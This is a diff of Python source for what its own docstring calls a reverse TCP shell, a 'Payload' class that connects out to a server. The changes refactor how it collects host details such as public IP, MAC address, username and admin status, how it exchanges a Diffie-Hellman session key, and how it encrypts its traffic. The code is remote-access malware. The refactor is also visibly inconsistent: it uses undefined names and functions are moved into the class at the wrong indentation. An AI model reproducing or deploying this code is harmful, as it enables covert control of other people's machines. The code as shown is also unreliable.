@@ -59,7 +59,7 @@ def threaded(function):
     return _threaded
 
 # main
-class Payload(threading.Thread):
+class Payload():
     """ 
     Reverse TCP shell designed to provide remote access
     to the host platform native terminal, enabling direct
@@ -67,7 +67,7 @@ class Payload(threading.Thread):
 
     """
 
-    def __init__(self, host='127.0.0.1', port=1337, ftp=None, imgur=None, pastebin=None):
+    def __init__(self, host='127.0.0.1', port=1337, **kwargs):
         """ 
         Create an instance of a reverse TCP shell 
 
@@ -75,19 +75,13 @@ class Payload(threading.Thread):
         :param str host:          server IP address
         :param int port:          server port number
 
-        `Optional`
-        :param str ftp:           host, user, password
-        :param str imgur:         api_key
-        :param str pastebin:      api_dev_key
-
         """
-        super(Payload, self).__init__()
         self.handlers   = {}
         self.flags      = self._get_flags()
-        self.api        = self._get_api(ftp=ftp, imgur=imgur, pastebin=pastebin)
+        self.api        = self._get_api(pastebin=pastebin)
         self.remote     = {"modules": [], "files": []}
-        self.connection = self.connect(host, port)
-        self.key        = self.difFiehellman(self.connection)
+        self.connection = connect(host, port)
+        self.key        = diffiehellman(self.connection)
         self.info       = self._get_info()
 
     def _get_flags(self):
@@ -109,41 +103,32 @@ class Payload(threading.Thread):
             if not base_url:
                 host, port = self.connection.getpeername()
                 base_url   = 'http://{}:{}'.format(host, port + 1)
-            self.handlers['modules']  = self._get_resources(target=self.remote['modules'], base_url='/'.join((base_url, 'modules')))
-            self.handlers['files']    = self._get_resources(target=self.remote['files'], base_url='/'.join((base_url, 'files')))
-
-    def _get_api(self, **kwargs):
-        for k,v in kwargs.items():
-            if isinstance(v, str):
-                try:
-                    kwargs[k] = json.loads(v)
-                except: pass
-            if isinstance(v, dict):
-                kwargs[k] = collections.namedtuple(k.capitalize(), v.keys())(*v.values())
-        return collections.namedtuple('API', kwargs.keys())(*kwargs.values())
+            self.resources = self._get_resources(target=self.remote['modules'], base_url='/'.join((base_url, 'modules')))
 
     def _get_info(self):
-        info = {function: globals()[function]() for function in [f for f in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device'] if f in globals() if callable(globals()[f])]}
-        data = encrypt_aes(json.dumps(info), self.key)
-        msg  = struct.pack('L', len(data)) + data
-        while True:
-            sent = self.connection.send(msg)
-            if len(msg) - sent:
-                msg = msg[sent:]
-            else:
-                break
-        header_size = struct.calcsize('L')
-        header      = self.connection.recv(header_size)
-        msg_len     = struct.unpack('L', header)[0]
-        data        = self.connection.recv(msg_len)
-        while len(data) < msg_len:
-            data += self.connection.recv(msg_len - len(msg))
-        if isinstance(data, bytes) and len(data):
-            data = encrypt_aes(data, self.key)
-            try:
-                info = json.loads(data)
-            except: pass
-        return collections.namedtuple('Session', info.keys())(*info.values())
+        for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
+            if function in globals() and callable(globals()[function]):
+                info = {function: globals()[function]() }
+                data = encrypt_aes(json.dumps(info), self.key)
+                msg  = struct.pack('L', len(data)) + data
+                while True:
+                    sent = self.connection.send(msg)
+                    if len(msg) - sent:
+                        msg = msg[sent:]
+                    else:
+                        break
+                header_size = struct.calcsize('L')
+                header      = self.connection.recv(header_size)
+                msg_len     = struct.unpack('L', header)[0]
+                data        = self.connection.recv(msg_len)
+                while len(data) < msg_len:
+                    data += self.connection.recv(msg_len - len(msg))
+                if isinstance(data, bytes) and len(data):
+                    data = encrypt_aes(data, self.key)
+                    try:
+                        info = json.loads(data)
+                    except: pass
+                return collections.namedtuple('Session', info.keys())(*info.values())
 
     @threaded
     def _get_resources(self, target=None, base_url=None):
@@ -1002,98 +987,98 @@ class Payload(threading.Thread):
         else:
             raise TypeError('argument `modules` must be a list or string of module names separated by commas')
 
-def diffiehellman(connection):
-    """ 
-    Diffie-Hellman Internet Key Exchange (RFC 2741)
+    def diffiehellman(connection):
+        """ 
+        Diffie-Hellman Internet Key Exchange (RFC 2741)
 
-    `Requires`
-    :param socket connection:     socket.socket object
+        `Requires`
+        :param socket connection:     socket.socket object
 
-    Returns the 256-bit binary digest of the SHA256 hash
-    of the shared session encryption key
+        Returns the 256-bit binary digest of the SHA256 hash
+        of the shared session encryption key
 
-    """
-    if isinstance(connection, socket.socket):
-        g  = 2
-        p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
-        a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
-        xA = pow(g, a, p)
-        connection.send(Crypto.Util.number.long_to_bytes(xA))
-        xB = Crypto.Util.number.bytes_to_long(connection.recv(256))
-        x  = pow(xB, a, p)
-        return Crypto.Hash.SHA256.new(Crypto.Util.number.long_to_bytes(x)).digest()
-    else:
-        raise TypeError("argument 'connection' must be type '{}'".format(socket.socket))
+        """
+        if isinstance(connection, socket.socket):
+            g  = 2
+            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
+            a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
+            xA = pow(g, a, p)
+            connection.send(Crypto.Util.number.long_to_bytes(xA))
+            xB = Crypto.Util.number.bytes_to_long(connection.recv(256))
+            x  = pow(xB, a, p)
+            return Crypto.Hash.SHA256.new(Crypto.Util.number.long_to_bytes(x)).digest()
+        else:
+            raise TypeError("argument 'connection' must be type '{}'".format(socket.socket))
 
-def encrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
-    """ 
-    XOR-128 encryption
+    def encrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
+        """ 
+        XOR-128 encryption
 
-    `Required`
-    :param str data:        plaintext
-    :param str key:         256-bit key
+        `Required`
+        :param str data:        plaintext
+        :param str key:         256-bit key
 
-    `Optional`
-    :param int block_size:  block size
-    :param int key_size:    key size
-    :param int num_rounds:  number of rounds
-    :param str padding:     padding character
+        `Optional`
+        :param int block_size:  block size
+        :param int key_size:    key size
+        :param int num_rounds:  number of rounds
+        :param str padding:     padding character
 
-    Returns encrypted ciphertext as base64-encoded string
+        Returns encrypted ciphertext as base64-encoded string
 
-    """
-    data    = bytes(data) + (int(block_size) - len(bytes(data)) % int(block_size)) * bytes(padding)
-    blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
-    vector  = os.urandom(8)
-    result  = [vector]
-    for block in blocks:
-        block   = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, block))
-        v0, v1  = struct.unpack("!2L", block)
-        k       = struct.unpack("!4L", key[:key_size])
-        sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
-        for round in range(num_rounds):
-            v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
-            sum = (sum + delta) & mask
-            v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
-        output  = vector = struct.pack("!2L", v0, v1)
-        result.append(output)
-    return base64.b64encode(bytes().join(result))
+        """
+        data    = bytes(data) + (int(block_size) - len(bytes(data)) % int(block_size)) * bytes(padding)
+        blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
+        vector  = os.urandom(8)
+        result  = [vector]
+        for block in blocks:
+            block   = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, block))
+            v0, v1  = struct.unpack("!2L", block)
+            k       = struct.unpack("!4L", key[:key_size])
+            sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
+            for round in range(num_rounds):
+                v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
+                sum = (sum + delta) & mask
+                v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
+            output  = vector = struct.pack("!2L", v0, v1)
+            result.append(output)
+        return base64.b64encode(bytes().join(result))
 
-def decrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
-    """ 
-    XOR-128 encryption
+    def decrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
+        """ 
+        XOR-128 encryption
 
-    `Required`
-    :param str data:        ciphertext
-    :param str key:         256-bit key
+        `Required`
+        :param str data:        ciphertext
+        :param str key:         256-bit key
 
-    `Optional`
-    :param int block_size:  block size
-    :param int key_size:    key size
-    :param int num_rounds:  number of rounds
-    :param str padding:     padding character
+        `Optional`
+        :param int block_size:  block size
+        :param int key_size:    key size
+        :param int num_rounds:  number of rounds
+        :param str padding:     padding character
 
-    Returns decrypted plaintext as string
+        Returns decrypted plaintext as string
 
-    """
-    data    = base64.b64decode(data)
-    blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
-    vector  = blocks[0]
-    result  = []
-    for block in blocks[1:]:
-        v0, v1 = struct.unpack("!2L", block)
-        k = struct.unpack("!4L", key[:key_size])
-        delta, mask = 0x9e3779b9L, 0xffffffffL
-        sum = (delta * num_rounds) & mask
-        for round in range(num_rounds):
-            v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
-            sum = (sum - delta) & mask
-            v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
-        decode = struct.pack("!2L", v0, v1)
-        output = str().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, decode))
-        vector = block
-        result.append(output)
-    return str().join(result).rstrip(padding)
+        """
+        data    = base64.b64decode(data)
+        blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
+        vector  = blocks[0]
+        result  = []
+        for block in blocks[1:]:
+            v0, v1 = struct.unpack("!2L", block)
+            k = struct.unpack("!4L", key[:key_size])
+            delta, mask = 0x9e3779b9L, 0xffffffffL
+            sum = (delta * num_rounds) & mask
+            for round in range(num_rounds):
+                v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
+                sum = (sum - delta) & mask
+                v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
+            decode = struct.pack("!2L", v0, v1)
+            output = str().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, decode))
+            vector = block
+            result.append(output)
+        return str().join(result).rstrip(padding)
 
 
     def connect(self, host, port):
@@ -1153,7 +1138,7 @@ def decrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr
                     data = struct.pack('!L', 0) + self.encrypt(json.dumps(task), self.key)
                 msg  = struct.pack('!L', len(data)) + data
                 while True:
-                    sent = self._socket.send(msg)
+                    sent = self.connection.send(msg)
                     if len(msg) - sent:
                         msg = msg[sent:]
                     else:
@@ -1175,12 +1160,12 @@ def decrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr
 
         """
         hdr_len = struct.calcsize('!L')
-        hdr     = self._socket.recv(hdr_len)
+        hdr     = self.connection.recv(hdr_len)
         msg_len = struct.unpack('!L', hdr)[0]
-        msg     = self._socket.recv(msg_len)
+        msg     = self.connection.recv(msg_len)
         while len(msg) < msg_len:
             try:
-                msg += self._socket.recv(msg_len - len(msg))
+                msg += self.connection.recv(msg_len - len(msg))
             except (socket.timeout, socket.error):
                 break
         if isinstance(msg, bytes) and len(msg):
